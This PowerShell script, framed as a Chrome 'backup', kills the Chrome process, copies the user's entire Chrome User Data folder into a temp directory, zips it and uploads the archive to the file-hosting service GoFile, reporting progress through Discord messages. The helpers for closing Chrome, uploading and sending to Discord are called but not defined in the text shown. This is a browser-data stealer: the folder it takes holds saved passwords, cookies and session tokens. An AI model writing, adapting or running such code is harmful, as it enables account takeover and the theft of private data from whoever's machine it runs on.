# Function to log messages (easier to debug)
function Log-Message {
    param ([string]$message)
    $logFile = "$env:TEMP\debug_log.txt"
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Add-Content -Path $logFile -Value "$timestamp - $message"
    Write-Output "$timestamp - $message"
}

# Compress and clean up
function Compress-Backup {
    param ([string]$tempFolder, [string]$outputZip)
    
    try {
        # Check if the temp folder contains any files
        $files = Get-ChildItem -Path $tempFolder -Recurse
        if ($files.Count -eq 0) {
            Log-Message "Temp folder is empty. No files to zip."
            Send-DiscordMessage "No files to zip in the Chrome backup."
            return $false
        }

        # Log the files in the temp folder
        Log-Message "Files found in temp folder for zipping:"
        $files | ForEach-Object { Log-Message $_.FullName }

        # Compress the folder
        Log-Message "Starting compression of $tempFolder..."
        Compress-Archive -Path "$tempFolder\*" -DestinationPath $outputZip -Force
        Log-Message "Compression complete. Zip file created: $outputZip"

        return $true
    } catch {
        Log-Message "Error during compression: $_"
        Send-DiscordMessage "Error compressing Chrome backup."
        return $false
    }
}

# Copy Chrome User Data (with retry logic and logging)
function Copy-ChromeData {
    param (
        [string]$source,
        [string]$destination
    )

    try {
        # Check if the source file exists and log it
        if (Test-Path $source) {
            Log-Message "Copying: $source to $destination"
            Copy-Item -Path $source -Destination $destination -Force
            Log-Message "File copied successfully: $source"
            return $true
        } else {
            Log-Message "Source file not found: $source"
            return $false
        }
    } catch {
        Log-Message "Error copying file: $source - $_"
        return $false
    }
}

# Main Process
function Main {
    # Prepare directories and file paths
    $chromePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data"
    $outputZip = "$env:TEMP\chrome_data.zip"
    $tempFolder = "$env:TEMP\ChromeBackup"

    # Step 1: Force close Chrome
    Force-CloseChrome

    # Step 2: Prepare the temp folder
    if (Test-Path $tempFolder) { Remove-Item -Recurse -Force $tempFolder }
    New-Item -ItemType Directory -Path $tempFolder | Out-Null

    # Step 3: Copy Chrome User Data
    Get-ChildItem -Path $chromePath -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
        $destination = $_.FullName -replace [regex]::Escape($chromePath), $tempFolder
        if (-not (Test-Path $destination)) { New-Item -ItemType Directory -Path (Split-Path -Parent $destination) -Force | Out-Null }
        if (Copy-ChromeData -source $_.FullName -destination $destination) {
            Log-Message "Copied: $($_.FullName)"
        } else {
            Log-Message "Skipped locked file: $($_.FullName)"
        }
    }

    # Step 4: Compress and clean up
    if (Compress-Backup -tempFolder $tempFolder -outputZip $outputZip) {
        Remove-Item -Recurse -Force $tempFolder
    }

    # Step 5: Upload the zip file to GoFile
    if (Test-Path $outputZip) {
        Upload-FileToGoFile -filePath $outputZip
    } else {
        Log-Message "Zip file not found after compression."
        Send-DiscordMessage "Failed to create the zip file."
    }
}

# Run the main function
Main
